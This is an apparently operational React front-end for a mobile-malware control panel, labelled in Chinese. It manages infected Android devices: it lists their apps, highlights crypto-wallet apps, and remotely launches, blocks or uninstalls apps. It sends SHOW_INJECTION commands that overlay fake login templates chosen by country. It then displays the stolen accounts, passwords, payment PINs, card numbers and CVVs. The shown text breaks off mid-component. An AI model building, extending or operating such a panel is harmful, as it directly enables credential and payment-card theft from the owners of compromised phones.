import{a as e,i as t,s as a}from"./createLucideIcon-BK-QvR86.js";import{t as s}from"./button-DtV4KcNI.js";import{B as l,Bt as n,Ct as r,F as c,Gt as i,Ht as o,J as d,Rt as x,T as p,c as m,d as h,l as u,lt as g,ot as b,s as f,st as N,v as j,y}from"./index-Cynq2_kK.js";var v=a(e(),1),w=t(),k=()=>{const e=localStorage.getItem("token");return{"Content-Type":"application/json",...e?{Authorization:`Bearer ${e}`}:{}}},S=({value:e,onChange:t,placeholder:a,className:s=""})=>(0,w.jsxs)("div",{className:`relative shrink-0 ${s}`,children:[(0,w.jsx)(b,{className:"absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-[#8b949e]"}),(0,w.jsx)("input",{className:"w-full pl-8 pr-3 py-1.5 border rounded-md text-sm bg-transparent border-[#30363d] text-[#e6edf3] placeholder-[#8b949e] focus:border-green-500 focus:outline-none",placeholder:a,value:e,onChange:e=>t(e.target.value)})]}),_=({deviceId:e,adbConnected:t=!0}={})=>{const[a]=(0,v.useState)(""),b=e||a,_=u(),[C,$]=(0,v.useState)([]),[P,T]=(0,v.useState)(!1),[L,I]=(0,v.useState)(""),[O,A]=(0,v.useState)(null),[E,z]=(0,v.useState)(!1),[J,M]=(0,v.useState)(1),[B,U]=h("appmgr_app"),[R,H]=(0,v.useState)([]),[D,F]=(0,v.useState)(!1),[G]=(0,v.useState)(""),[K,V]=(0,v.useState)(!1),[W,q]=(0,v.useState)(1),[Q,X]=h("appmgr_cred"),[Y,Z]=(0,v.useState)([]),[ee,te]=(0,v.useState)(!1),[ae]=(0,v.useState)(""),[se,le]=(0,v.useState)(()=>localStorage.getItem("inj_country_filter")||"all"),ne=(0,v.useCallback)(e=>{le(e),localStorage.setItem("inj_country_filter",e)},[]),[re,ce]=(0,v.useState)(!1),[ie,oe]=(0,v.useState)(null),[de,xe]=(0,v.useState)(1),[pe,me]=h("appmgr_inj"),[he,ue]=(0,v.useState)(new Set),[ge,be]=(0,v.useState)(new Set),[fe,Ne]=(0,v.useState)(new Set),[je,ye]=(0,v.useState)(new Set),[ve,we]=(0,v.useState)(()=>{try{const t=localStorage.getItem(`device_inj_ov_${e}`);return t?new Map(JSON.parse(t)):new Map}catch{return new Map}}),[ke,Se]=(0,v.useState)(()=>"false"!==localStorage.getItem(`auto_inj_${e}`)),[_e,Ce]=(0,v.useState)(null),[$e,Pe]=(0,v.useState)(()=>localStorage.getItem("notification_content_global")||""),[Te,Le]=(0,v.useState)("top"),Ie=(0,v.useCallback)(async()=>{if(b){T(!0);try{const e=await(await fetch(`/m/device/${b}/apps`,{headers:k()})).json(),t=Array.isArray(e)?e:[];$(t),be(new Set(t.filter(e=>e.isBlocked).map(e=>e.packageName)))}catch{$([])}finally{T(!1)}}},[b]),Oe=(0,v.useCallback)(async()=>{if(b){T(!0),Me();try{await fetch(`/m/device/${b}/command`,{method:"POST",headers:k(),body:JSON.stringify({command:"GET_APP_LIST",payload:{includeSystem:!1,includeIcon:!0}})}),await new Promise(e=>setTimeout(e,3e3)),await Ie()}catch{T(!1)}}},[b,Ie]),Ae=(0,v.useCallback)(async()=>{if(b){F(!0);try{const e=await(await fetch(`/m/device/${b}/credentials`,{headers:k()})).json(),t=(Array.isArray(e)?e:e?.data||[]).filter(e=>"injection"===e.type);H(t),ye(new Set(t.map(e=>e.app_pkg).filter(Boolean)))}catch{H([])}finally{F(!1)}}},[b]),Ee=(0,v.useCallback)(async()=>{te(!0);try{const e=await(await fetch("/m/injections",{headers:k()})).json();Z(Array.isArray(e)?e:[])}catch{Z([])}finally{te(!1)}},[]),ze=async(e,t)=>{A(`${e}:${t}`);try{const a=await(await fetch(`/m/device/${b}/command`,{method:"POST",headers:k(),body:JSON.stringify({command:e,payload:{packageName:t}})})).json(),s=void 0===a.data?.success||a.data.success;if(a.ok&&s)c.success("UNINSTALL_APP"===e?"卸载成功":"操作成功"),"UNINSTALL_APP"===e&&$(e=>e.filter(e=>e.packageName!==t));else{const e=a.error||a.data?.data?.output||"操作失败";c.error(e)}}catch(a){c.error(a?.message||"请求失败")}finally{setTimeout(()=>A(null),800)}},Je=(0,v.useCallback)(e=>{const t=ve.get(e.app_pkg);return void 0!==t?t:e.enabled},[ve]),Me=(0,v.useCallback)(async()=>{try{const e=await(await fetch("/m/cryptowallet",{headers:k()})).json();ue(new Set((Array.isArray(e)?e:[]).map(e=>e.package_name).filter(e=>Boolean(e))))}catch{}},[]);(0,v.useEffect)(()=>{b&&(Ie(),Ae()),Ee(),Me()},[b]);const Be=(0,v.useMemo)(()=>C.filter(e=>{const t=L.toLowerCase();return!t||(e.packageName||"").toLowerCase().includes(t)||(e.appName||"").toLowerCase().includes(t)}),[C,L]),Ue=(0,v.useMemo)(()=>R.filter(e=>{const t=G.toLowerCase();return!t||e.app_pkg?.toLowerCase().includes(t)||e.login?.toLowerCase().includes(t)||e.password?.toLowerCase().includes(t)}),[R,G]),Re=(0,v.useMemo)(()=>Y.filter(e=>{if(ke&&!Je(e)&&!je.has(e.app_pkg))return!1;if("all"!==se&&(e.country||"全球")!==se)return!1;const t=ae.toLowerCase();return!t||e.app_pkg?.toLowerCase().includes(t)||e.label?.toLowerCase().includes(t)||e.country?.toLowerCase().includes(t)}),[Y,ae,se,ke,Je,je]),He=(0,v.useMemo)(()=>{const e={};return Y.forEach(t=>{const a=t.country||"全球";e[a]=(e[a]||0)+1}),Object.entries(e).sort((e,t)=>t[1]-e[1])},[Y]),De=Y.filter(e=>Je(e)).length;(0,v.useEffect)(()=>{const e=e=>{const{device_id:t,app_pkg:a}=e.detail||{};t===b&&a&&(ye(e=>new Set(e).add(a)),Ae())};return window.addEventListener("injection_stopped",e),()=>window.removeEventListener("injection_stopped",e)},[b,Ae]),(0,v.useEffect)(()=>{M(1)},[L]),(0,v.useEffect)(()=>{q(1)},[G]),(0,v.useEffect)(()=>{xe(1)},[ae,se]);const Fe=Be.slice((J-1)*B,J*B),Ge=Ue.slice((W-1)*Q,W*Q),Ke=Re.slice((de-1)*pe,de*pe),Ve="bg-[#21262d] border-[#30363d] text-[#c9d1d9] hover:bg-[#30363d] hover:text-[#e6edf3]",We=({value:e,onChange:t,options:a,className:s=""})=>{const[l,r]=(0,v.useState)(!1),[c,i]=(0,v.useState)(""),o=(0,v.useRef)(null),d=(0,v.useRef)(null);(0,v.useEffect)(()=>{if(!l)return;i(""),setTimeout(()=>d.current?.focus(),0);const e=e=>{o.current&&!o.current.contains(e.target)&&r(!1)};return document.addEventListener("mousedown",e),()=>document.removeEventListener("mousedown",e)},[l]);const x=a.find(t=>t.value===e),p=c?a.filter(e=>e.label.toLowerCase().includes(c.toLowerCase())):a;return(0,w.jsxs)("div",{className:`relative ${s}`,ref:o,children:[(0,w.jsxs)("button",{type:"button",onClick:()=>r(!l),className:"flex items-center justify-between w-full px-2.5 py-1.5 text-sm bg-[#21262d] border border-[#30363d] rounded-md text-[#c9d1d9] hover:bg-[#30363d] hover:text-[#e6edf3]",children:[(0,w.jsx)("span",{className:"truncate",children:x?.label||e}),(0,w.jsx)(n,{className:"h-3.5 w-3.5 ml-1.5 opacity-50 shrink-0"})]}),l&&(0,w.jsxs)("div",{className:"absolute right-0 top-full mt-1 z-20 bg-[#161b22] border border-[#30363d] rounded-md shadow-lg min-w-full w-[200px]",children:[(0,w.jsx)("div",{className:"p-1.5 border-b border-[#30363d]",children:(0,w.jsx)("input",{ref:d,type:"text",value:c,onChange:e=>i(e.target.value),placeholder:"搜索地区...",className:"w-full px-2 py-1 text-sm bg-[#21262d] border border-[#30363d] rounded text-[#e6edf3] placeholder:text-[#484f58] outline-none focus:border-[#58a6ff]"})}),(0,w.jsx)("div",{className:"py-1 max-h-48 overflow-y-auto",children:0===p.length?(0,w.jsx)("div",{className:"px-3 py-2 text-sm text-[#484f58]",children:"无匹配结果"}):p.map(a=>(0,w.jsx)("button",{type:"button",className:"w-full text-left px-3 py-1.5 text-sm hover:bg-[#30363d] hover:text-[#e6edf3] "+(a.value===e?"text-cyan-400 font-medium":"text-[#c9d1d9]"),onClick:()=>{t(a.value),r(!1)},children:a.label},a.value))})]})]})},qe=({icon:e,title:t,badge:a,collapsed:l,onToggle:r,extra:c,onRefresh:i,loading:o})=>(0,w.jsxs)("div",{className:"flex items-center justify-between gap-2 px-3 py-2 border-b border-[#30363d] shrink-0",children:[(0,w.jsxs)("div",{className:"flex items-center gap-2 min-w-0 cursor-pointer select-none",onClick:r,children:[e,(0,w.jsx)("span",{className:"text-sm font-semibold text-[#e6edf3]",children:t}),void 0!==a&&(0,w.jsx)(p,{className:"bg-[#30363d] text-[#8b949e] border-[#30363d]",children:a})]}),(0,w.jsxs)("div",{className:"flex items-center gap-1.5 shrink-0",onClick:e=>e.stopPropagation(),children:[c,i&&(0,w.jsx)(s,{size:"sm",variant:"outline",className:Ve,onClick:i,disabled:o,children:(0,w.jsx)(g,{className:"h-3.5 w-3.5 "+(o?"animate-spin":"")})}),(0,w.jsx)(s,{size:"sm",variant:"outline",className:`h-8 w-8 p-0 ${Ve}`,onClick:r,children:l?(0,w.jsx)(n,{className:"h-3.5 w-3.5"}):(0,w.jsx)(x,{className:"h-3.5 w-3.5"})})]})]}),Qe=(0,v.useCallback)(e=>{if(fe.has(e))return!0;const t=Y.find(t=>t.app_pkg===e);if(!t)return!1;const a=ve.get(e);return void 0!==a?a:t.enabled},[fe,ve,Y]);



const [tab, setTab] = (0, v.useState)("apps");
const tabBtn = (id, icon, label, badge) => (0, w.jsxs)("button", {
    type: "button",
    onClick: () => setTab(id),
    className: "flex-1 flex items-center justify-center gap-1.5 h-8 px-2 rounded-md text-sm border transition-colors " + (tab === id ? "bg-[#21262d] border-[#30363d] text-[#e6edf3] font-medium" : "border-transparent text-[#8b949e] hover:text-[#c9d1d9] hover:bg-[#161b22]"),
    children: [icon, label, (0, w.jsx)(p, { className: "bg-[#30363d] text-[#8b949e] border-[#30363d]", children: badge })]
}, id);
return (0, w.jsxs)(j, {
    className: "border-[#30363d] bg-[#161b22] flex flex-col h-full",
    children: (0, w.jsxs)(y, {
        className: "p-3 flex flex-col flex-1 min-h-0 gap-2",
        children: [
            /* 顶部三段式 Tab */
            (0, w.jsxs)("div", {
                className: "flex items-center gap-1 p-1 bg-[#0d1117] border border-[#30363d] rounded-lg shrink-0",
                children: [
                    tabBtn("apps", (0, w.jsx)(i, { className: "h-4 w-4 text-purple-400" }), "应用列表", `${Be.length}/${C.length}`),
                    tabBtn("inj", (0, w.jsx)(N, { className: "h-4 w-4 text-cyan-400" }), "注入模板", `${De}/${Y.length}`),
                    tabBtn("data", (0, w.jsx)(r, { className: "h-4 w-4 text-amber-400" }), "注入数据", R.length)
                ]
            }),

            /* ===== Tab 1: 应用列表 ===== */
            "apps" === tab && (0, w.jsxs)("div", {
                className: "flex-1 min-h-0 flex flex-col gap-2",
                children: [
                    (0, w.jsxs)("div", {
                        className: "flex items-center gap-2 shrink-0",
                        children: [(0, w.jsx)(S, {
                            value: L,
                            onChange: I,
                            placeholder: "搜索应用名或包名...",
                            className: "flex-1"
                        }), (0, w.jsx)(s, {
                            size: "sm",
                            variant: "outline",
                            className: "h-8 px-2.5 " + Ve,
                            onClick: Oe,
                            disabled: P,
                            title: "从设备刷新应用列表",
                            children: (0, w.jsx)(g, { className: "h-3.5 w-3.5 " + (P ? "animate-spin" : "") })
                        })]
                    }),
                    P ? (0, w.jsxs)("div", {
                        className: "flex-1 flex items-center justify-center text-[#8b949e] text-sm",
                        children: [(0, w.jsx)(g, { className: "h-4 w-4 animate-spin mr-2" }), "加载中..."]
                    }) : 0 === Be.length ? (0, w.jsx)("div", {
                        className: "flex-1 flex items-center justify-center text-[#8b949e] text-sm",
                        children: C.length ? "无匹配结果" : "暂无数据"
                    }) : (0, w.jsx)("div", {
                        className: "flex-1 overflow-auto min-h-0",
                        children: (0, w.jsxs)("table", {
                            className: "w-full text-[12px] table-fixed",
                            children: [(0, w.jsxs)("colgroup", {
                                children: [(0, w.jsx)("col", { className: "w-[44px]" }), (0, w.jsx)("col", { className: "w-[20%]" }), (0, w.jsx)("col", {}), (0, w.jsx)("col", { className: "w-[250px]" })]
                            }), (0, w.jsx)("thead", {
                                className: "sticky top-0 bg-[#161b22] z-10",
                                children: (0, w.jsxs)("tr", {
                                    className: "border-b border-[#30363d] text-[#8b949e] text-left",
                                    children: [(0, w.jsx)("th", { className: "px-2 py-2 font-medium" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "应用名" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "包名" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium text-right", children: "操作" })]
                                })
                            }), (0, w.jsx)("tbody", {
                                children: Fe.map(e => (0, w.jsxs)("tr", {
                                    className: "border-b border-[#30363d]/50 hover:bg-[#0d1117] transition-colors",
                                    children: [(0, w.jsx)("td", {
                                        className: "px-2 py-1.5",
                                        children: e.icon ? (0, w.jsx)("img", { src: `data:image/png;base64,${e.icon}`, className: "w-8 h-8 rounded-lg object-contain", alt: "" }) : (0, w.jsx)("div", { className: "w-8 h-8 rounded-lg bg-[#30363d] flex items-center justify-center text-[#8b949e] text-[11px]", children: "?" })
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 truncate " + (he.has(e.packageName) ? "text-red-400 font-medium" : "text-[#e6edf3]"),
                                        children: e.appName || "-"
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 truncate " + (he.has(e.packageName) ? "text-red-400 font-medium" : "text-[#8b949e]"),
                                        children: e.packageName
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5",
                                        children: (0, w.jsxs)("div", {
                                            className: "flex justify-end gap-1 flex-nowrap",
                                            children: [
                                                (0, w.jsx)(s, {
                                                    size: "sm",
                                                    variant: "outline",
                                                    className: "!h-6 !px-1.5 !text-[11px] bg-green-500/10 border-green-500/20 text-green-400 hover:bg-green-500/20 disabled:opacity-40",
                                                    disabled: !t || O === `LAUNCH_APP:${e.packageName}`,
                                                    onClick: () => ze("LAUNCH_APP", e.packageName),
                                                    children: O === `LAUNCH_APP:${e.packageName}` ? "..." : "启动"
                                                }),
                                                (0, w.jsx)(s, {
                                                    size: "sm",
                                                    variant: "outline",
                                                    className: `!h-6 !px-1.5 !text-[11px] disabled:opacity-40 ${ge.has(e.packageName)?"bg-purple-500/10 border-purple-500/20 text-purple-400 hover:bg-purple-500/20":Ve}`,
                                                    disabled: !t || O === `block:${e.packageName}`,
                                                    onClick: () => (async e => {
                                                        const t = ge.has(e),
                                                            a = t ? "UNBLOCK_APP" : "BLOCK_APP";
                                                        A(`block:${e}`);
                                                        try {
                                                            await fetch(`/m/device/${b}/command`, {
                                                                method: "POST",
                                                                headers: k(),
                                                                body: JSON.stringify({
                                                                    command: a,
                                                                    payload: {
                                                                        packageName: e
                                                                    }
                                                                })
                                                            }), be(a => {
                                                                const s = new Set(a);
                                                                return t ? s.delete(e) : s.add(e), s
                                                            })
                                                        } finally {
                                                            setTimeout(() => A(null), 800)
                                                        }
                                                    })(e.packageName),
                                                    children: O === `block:${e.packageName}` ? "..." : ge.has(e.packageName) ? "启用" : "禁用"
                                                }),
                                                (0, w.jsx)(s, {
                                                    size: "sm",
                                                    variant: "outline",
                                                    className: "!h-6 !px-1.5 !text-[11px] disabled:opacity-40 " + (je.has(e.packageName) ? "bg-blue-500/10 border-blue-500/20 text-blue-400 hover:bg-blue-500/20" : fe.has(e.packageName) ? "bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20" : Qe(e.packageName) ? "bg-orange-500/10 border-orange-500/20 text-orange-400 hover:bg-orange-500/20" : Ve),
                                                    disabled: !t || O === `inject:${e.packageName}`,
                                                    onClick: () => (async e => {
                                                        const t = Qe(e);
                                                        A(`inject:${e}`);
                                                        try {
                                                            if (t) await fetch(`/m/device/${b}/command`, {
                                                                method: "POST",
                                                                headers: k(),
                                                                body: JSON.stringify({
                                                                    command: "STOP_INJECTION",
                                                                    payload: {
                                                                        packageName: e
                                                                    }
                                                                })
                                                            }), Ne(t => {
                                                                const a = new Set(t);
                                                                return a.delete(e), a
                                                            }), we(t => {
                                                                const a = new Map(t);
                                                                return a.set(e, !1), localStorage.setItem(`device_inj_ov_${b}`, JSON.stringify([...a])), a
                                                            });
                                                            else {
                                                                const t = Y.find(t => t.app_pkg === e),
                                                                    a = {
                                                                        packageName: e
                                                                    };
                                                                t && (a.templateId = String(t.id)), await fetch(`/m/device/${b}/command`, {
                                                                    method: "POST",
                                                                    headers: k(),
                                                                    body: JSON.stringify({
                                                                        command: "SHOW_INJECTION",
                                                                        payload: a
                                                                    })
                                                                }), Ne(t => new Set(t).add(e)), we(t => {
                                                                    const a = new Map(t);
                                                                    return a.set(e, !0), localStorage.setItem(`device_inj_ov_${b}`, JSON.stringify([...a])), a
                                                                })
                                                            }
                                                        } finally {
                                                            setTimeout(() => A(null), 800)
                                                        }
                                                    })(e.packageName),
                                                    children: O === `inject:${e.packageName}` ? "..." : je.has(e.packageName) ? "已捕获" : fe.has(e.packageName) ? "注入中" : Qe(e.packageName) ? "自动" : "注入"
                                                }),
                                                (0, w.jsx)(s, {
                                                    size: "sm",
                                                    variant: "outline",
                                                    className: "!h-6 !px-1.5 !text-[11px] bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20 disabled:opacity-40",
                                                    disabled: !t || O === `UNINSTALL_APP:${e.packageName}`,
                                                    onClick: async () => {
                                                        await _({
                                                            title: "卸载应用",
                                                            description: `确定卸载「${e.appName||e.packageName}」？`,
                                                            variant: "danger",
                                                            confirmText: "卸载",
                                                            cancelText: "取消"
                                                        }) && ze("UNINSTALL_APP", e.packageName)
                                                    },
                                                    children: O === `UNINSTALL_APP:${e.packageName}` ? "..." : "卸载"
                                                }),
                                                (0, w.jsx)(s, {
                                                    size: "sm",
                                                    variant: "outline",
                                                    className: "!h-6 !px-1.5 !text-[11px] disabled:opacity-40 " + Ve,
                                                    disabled: !t,
                                                    onClick: () => Ce({
                                                        pkg: e.packageName,
                                                        label: e.appName || e.packageName
                                                    }),
                                                    children: "通知"
                                                })
                                            ]
                                        })
                                    })]
                                }, e.packageName))
                            })]
                        })
                    }), (0, w.jsx)(f, {
                        page: J,
                        perPage: B,
                        total: Be.length,
                        onPageChange: M,
                        onPerPageChange: U,
                        className: "pt-1 shrink-0"
                    })]
            }),

            /* ===== Tab 2: 注入模板 ===== */
            "inj" === tab && (0, w.jsxs)("div", {
                className: "flex-1 min-h-0 flex flex-col gap-2",
                children: [
                    (0, w.jsxs)("div", {
                        className: "flex items-center gap-2 shrink-0 flex-wrap",
                        children: [(0, w.jsxs)("label", {
                            className: "flex items-center gap-1.5 cursor-pointer select-none",
                            children: [(0, w.jsx)("span", { className: "text-xs text-[#8b949e]", children: "自动注入" }), (0, w.jsx)("button", {
                                type: "button",
                                onClick: () => Se(e => {
                                    const t = !e;
                                    return localStorage.setItem(`auto_inj_${b}`, String(t)), t
                                }),
                                className: "relative inline-flex h-4 w-7 items-center rounded-full transition-colors " + (ke ? "bg-green-500" : "bg-[#30363d]"),
                                children: (0, w.jsx)("span", { className: "inline-block h-3 w-3 rounded-full bg-white transition-transform " + (ke ? "translate-x-[13px]" : "translate-x-[2px]") })
                            })]
                        }), He.length > 1 && (0, w.jsx)(We, {
                            value: se,
                            onChange: ne,
                            options: [{
                                value: "all",
                                label: `全部地区 (${Y.length})`
                            }, ...He.map(([e, t]) => ({
                                value: e,
                                label: `${m(e)||e} (${t})`
                            }))],
                            className: "w-[130px]"
                        }), (0, w.jsx)("div", { className: "flex-1" }), (0, w.jsx)(s, {
                            size: "sm",
                            variant: "outline",
                            className: "h-8 px-2.5 " + Ve,
                            onClick: Ee,
                            disabled: ee,
                            title: "刷新注入模板",
                            children: (0, w.jsx)(g, { className: "h-3.5 w-3.5 " + (ee ? "animate-spin" : "") })
                        })]
                    }),
                    ee ? (0, w.jsxs)("div", {
                        className: "flex-1 flex items-center justify-center text-[#8b949e] text-sm",
                        children: [(0, w.jsx)(g, { className: "h-4 w-4 animate-spin mr-2" }), "加载中..."]
                    }) : 0 === Re.length ? (0, w.jsx)("div", {
                        className: "flex-1 flex items-center justify-center text-[#8b949e] text-sm",
                        children: "暂无注入模板"
                    }) : (0, w.jsx)("div", {
                        className: "flex-1 overflow-auto min-h-0",
                        children: (0, w.jsxs)("table", {
                            className: "w-full text-[12px] table-fixed",
                            children: [(0, w.jsxs)("colgroup", {
                                children: [(0, w.jsx)("col", { className: "w-[26%]" }), (0, w.jsx)("col", {}), (0, w.jsx)("col", { className: "w-[72px]" }), (0, w.jsx)("col", { className: "w-[86px]" })]
                            }), (0, w.jsx)("thead", {
                                className: "sticky top-0 bg-[#161b22] z-10",
                                children: (0, w.jsxs)("tr", {
                                    className: "border-b border-[#30363d] text-[#8b949e] text-left",
                                    children: [(0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "名称" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "包名" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "地区" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium text-right", children: "状态" })]
                                })
                            }), (0, w.jsx)("tbody", {
                                children: Ke.map(e => (0, w.jsxs)("tr", {
                                    className: "border-b border-[#30363d]/50 hover:bg-[#0d1117] transition-colors",
                                    children: [(0, w.jsxs)("td", {
                                        className: "px-2 py-1.5 text-[#e6edf3] truncate",
                                        children: [e.icon && (0, w.jsx)("span", { className: "mr-1", children: e.icon }), e.label || "-"]
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 text-[#8b949e] truncate",
                                        children: e.app_pkg
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 truncate",
                                        children: (0, w.jsx)("button", {
                                            type: "button",
                                            className: "hover:text-cyan-400 transition-colors " + (se === (e.country || "全球") ? "text-cyan-400 font-medium" : "text-[#8b949e]"),
                                            onClick: () => ne(se === (e.country || "全球") ? "all" : e.country || "全球"),
                                            children: m(e.country) || e.country || "-"
                                        })
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 text-right",
                                        children: (0, w.jsx)(s, {
                                            size: "sm",
                                            variant: "outline",
                                            className: "!h-6 !px-2 !text-[11px] " + (je.has(e.app_pkg) ? "bg-blue-500/10 border-blue-500/20 text-blue-400 hover:bg-blue-500/20" : fe.has(e.app_pkg) ? "bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20" : Je(e) ? "bg-green-500/10 border-green-500/20 text-green-400 hover:bg-green-500/20" : Ve),
                                            disabled: ie === e.id,
                                            onClick: () => (async e => {
                                                if (!b) return;
                                                const t = Je(e);
                                                oe(e.id);
                                                try {
                                                    const a = t ? "STOP_INJECTION" : "SHOW_INJECTION",
                                                        s = {
                                                            packageName: e.app_pkg
                                                        };
                                                    t || (s.templateId = String(e.id)), await fetch(`/m/device/${b}/command`, {
                                                        method: "POST",
                                                        headers: k(),
                                                        body: JSON.stringify({
                                                            command: a,
                                                            payload: s
                                                        })
                                                    }), we(a => {
                                                        const s = new Map(a);
                                                        return s.set(e.app_pkg, !t), localStorage.setItem(`device_inj_ov_${b}`, JSON.stringify([...s])), a
                                                    })
                                                } finally {
                                                    oe(null)
                                                }
                                            })(e),
                                            children: ie === e.id ? "..." : je.has(e.app_pkg) ? "已捕获" : fe.has(e.app_pkg) ? "注入中" : Je(e) ? "已启用" : "注入"
                                        })
                                    })]
                                }, e.id))
                            })]
                        })
                    }), (0, w.jsx)(f, {
                        page: de,
                        perPage: pe,
                        total: Re.length,
                        onPageChange: xe,
                        onPerPageChange: me,
                        className: "pt-1 shrink-0"
                    })]
            }),

            /* ===== Tab 3: 注入数据 ===== */
            "data" === tab && (0, w.jsxs)("div", {
                className: "flex-1 min-h-0 flex flex-col gap-2",
                children: [
                    (0, w.jsxs)("div", {
                        className: "flex items-center gap-2 shrink-0",
                        children: [(0, w.jsxs)("span", {
                            className: "text-xs text-[#8b949e]",
                            children: ["共 ", Ue.length, " 条"]
                        }), (0, w.jsx)("div", { className: "flex-1" }), R.length > 0 && (0, w.jsxs)(s, {
                            size: "sm",
                            variant: "outline",
                            className: "h-7 px-2 text-[11px] bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20 gap-1",
                            onClick: async () => {
                                await _({
                                    title: "清空注入数据",
                                    description: `确定清空该设备的全部 ${R.length} 条注入数据？`,
                                    variant: "danger",
                                    confirmText: "清空",
                                    cancelText: "取消"
                                }) && (async () => {
                                    if (b) try {
                                        await fetch(`/m/device/${b}/credentials`, {
                                            method: "DELETE",
                                            headers: k()
                                        });
                                        const t = new Set(R.map(e => e.app_pkg).filter(Boolean));
                                        H([]), ye(new Set), we(a => {
                                            const s = new Map(a);
                                            return t.forEach(e => s.set(e, !0)), localStorage.setItem(`device_inj_ov_${e}`, JSON.stringify([...s])), s
                                        }), c.success("已清空")
                                    } catch {}
                                })()
                            },
                            children: [(0, w.jsx)(d, { className: "h-3 w-3" }), "清空"]
                        }), (0, w.jsx)(s, {
                            size: "sm",
                            variant: "outline",
                            className: "h-8 px-2.5 " + Ve,
                            onClick: Ae,
                            disabled: D,
                            title: "刷新注入数据",
                            children: (0, w.jsx)(g, { className: "h-3.5 w-3.5 " + (D ? "animate-spin" : "") })
                        })]
                    }),
                    D ? (0, w.jsxs)("div", {
                        className: "flex-1 flex items-center justify-center text-[#8b949e] text-sm",
                        children: [(0, w.jsx)(g, { className: "h-4 w-4 animate-spin mr-2" }), "加载中..."]
                    }) : 0 === Ue.length ? (0, w.jsx)("div", {
                        className: "flex-1 flex items-center justify-center text-[#8b949e] text-sm",
                        children: "暂无注入数据"
                    }) : (0, w.jsx)("div", {
                        className: "flex-1 overflow-auto min-h-0",
                        children: (0, w.jsxs)("table", {
                            className: "w-full text-[12px] table-fixed",
                            children: [(0, w.jsxs)("colgroup", {
                                children: [(0, w.jsx)("col", { className: "w-[88px]" }), (0, w.jsx)("col", {}), (0, w.jsx)("col", {}), (0, w.jsx)("col", { className: "w-[60px]" }), (0, w.jsx)("col", {}), (0, w.jsx)("col", { className: "w-[46px]" }), (0, w.jsx)("col", { className: "w-[34px]" }), (0, w.jsx)("col", { className: "w-[24px]" })]
                            }), (0, w.jsx)("thead", {
                                className: "sticky top-0 bg-[#161b22] z-10",
                                children: (0, w.jsxs)("tr", {
                                    className: "border-b border-[#30363d] text-[#8b949e] text-left",
                                    children: [(0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "应用" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "账号" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "密码" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "支付" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "银行卡" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "日期" }), (0, w.jsx)("th", { className: "px-2 py-2 font-medium", children: "CVV" }), (0, w.jsx)("th", {})]
                                })
                            }), (0, w.jsx)("tbody", {
                                children: Ge.map(t => (0, w.jsxs)("tr", {
                                    className: "border-b border-[#30363d]/50 hover:bg-[#0d1117] transition-colors",
                                    children: [(0, w.jsx)("td", {
                                        className: "px-2 py-1.5 text-[#e6edf3] truncate",
                                        children: (0, w.jsxs)("span", {
                                            className: "relative group/tip",
                                            children: [t.app_name || t.app_pkg || "-", (0, w.jsx)("span", {
                                                className: "absolute top-full left-1/2 -translate-x-1/2 mt-1.5 px-3 py-1.5 text-sm text-[#e6edf3] bg-[#1c2128] border border-[#30363d] rounded-lg shadow-xl whitespace-nowrap opacity-0 pointer-events-none group-hover/tip:opacity-100 transition-opacity z-50",
                                                children: t.app_name || t.app_pkg
                                            })]
                                        })
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 text-[#c9d1d9] truncate",
                                        title: t.login || "-",
                                        children: t.login || "-"
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 text-amber-300 font-medium truncate",
                                        title: t.password || "-",
                                        children: t.password || "-"
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 text-red-400 font-medium truncate",
                                        children: t.pay_pin || "-"
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 text-[#c9d1d9] truncate",
                                        title: t.card || "-",
                                        children: t.card || "-"
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 text-[#8b949e] truncate whitespace-nowrap",
                                        children: t.exp_date || "-"
                                    }), (0, w.jsx)("td", {
                                        className: "px-2 py-1.5 text-[#8b949e] truncate",
                                        children: t.cvv || "-"
                                    }), (0, w.jsx)("td", {
                                        className: "px-1 py-1.5 text-center",
                                        children: (0, w.jsx)("button", {
                                            className: "text-[#8b949e] hover:text-red-400 transition-colors p-0.5",
                                            onClick: async () => {
                                                await _({
                                                    title: "删除记录",
                                                    description: "确定删除该条注入数据？",
                                                    variant: "danger",
                                                    confirmText: "删除",
                                                    cancelText: "取消"
                                                }) && (async t => {
                                                    try {
                                                        const a = R.find(e => e.id === t);
                                                        await fetch(`/m/credential/${t}`, {
                                                            method: "DELETE",
                                                            headers: k()
                                                        }), H(e => e.filter(e => e.id !== t)), a?.app_pkg && 0 === R.filter(e => e.id !== t && e.app_pkg === a.app_pkg).length && (ye(e => {
                                                            const t = new Set(e);
                                                            return t.delete(a.app_pkg), t
                                                        }), we(t => {
                                                            const s = new Map(t);
                                                            return s.set(a.app_pkg, !0), localStorage.setItem(`device_inj_ov_${e}`, JSON.stringify([...s])), s
                                                        })), c.success("已删除")
                                                    } catch {}
                                                })(t.id)
                                            },
                                            children: (0, w.jsx)(d, { className: "h-3.5 w-3.5" })
                                        })
                                    })]
